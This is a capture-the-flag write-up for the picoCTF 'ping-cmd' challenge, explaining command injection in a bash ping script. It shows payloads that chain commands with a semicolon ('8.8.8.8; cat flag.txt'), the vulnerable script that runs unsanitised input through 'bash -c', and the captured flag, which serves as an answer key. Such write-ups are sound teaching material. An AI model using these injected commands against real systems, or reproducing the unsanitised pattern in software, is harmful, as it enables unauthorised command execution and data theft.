
# picoCTF Write-up: ping-cmd

## Challenge Details
- **Name:** ping-cmd
- **Difficulty:** Easy
- **Category:** General Skills
- **Author:** YAHAYA MEDDY

---

## Description
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

Connect to the service:

```bash
nc mysterious-sea.picoctf.net 61300
```

---

## Hints
- Sometimes you can run more than one command at a time.
- The program uses a shell command behind the scenes.

---

# Solution Walkthrough

## 1. Initial Reconnaissance

Connecting to the challenge via Netcat presents a prompt asking for an IP address to ping, claiming **"tight security"** because it only allows `8.8.8.8`.

```bash
nc mysterious-sea.picoctf.net 61300
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
```

Providing the expected input executes a normal `ping` command and returns the output.  
The hints suggest the program passes user input directly into a shell command.

---

## 2. Testing for Command Injection

In Linux, multiple commands can be chained using a **semicolon (`;`)**.

If input is not sanitized, we can execute additional commands after the intended `ping` command.

Test payload:

```bash
8.8.8.8; ls
```

Example interaction:

```bash
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
```

Output:

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
... ping output ...

flag.txt
script.sh
```

The injection works. We can list files on the server.

---

## 3. Capturing the Flag

Now that we know the flag is stored in `flag.txt`, we can read it using `cat`.

Payload:

```bash
8.8.8.8; cat flag.txt
```

Example:

```bash
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
```

Output:

```
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae}
```

---

## 4. Root Cause Analysis

We can also read the server script to see why the vulnerability exists.

Payload:

```bash
8.8.8.8; cat script.sh
```

### Vulnerable Source Code

```bash
#!/bin/bash
echo -n "Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): "
read domain
bash -c "ping -c2 $domain"
```

### Why It Is Vulnerable

The script:

1. Reads user input into the variable `domain`.
2. Inserts it directly into a `bash -c` command.
3. Performs **no validation or sanitization**.

As a result, attackers can inject additional shell commands using separators such as `;`.

Example:

```
8.8.8.8; cat flag.txt
```

This executes:

```
ping -c2 8.8.8.8
cat flag.txt
```

---

# Flag

```
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae}
```
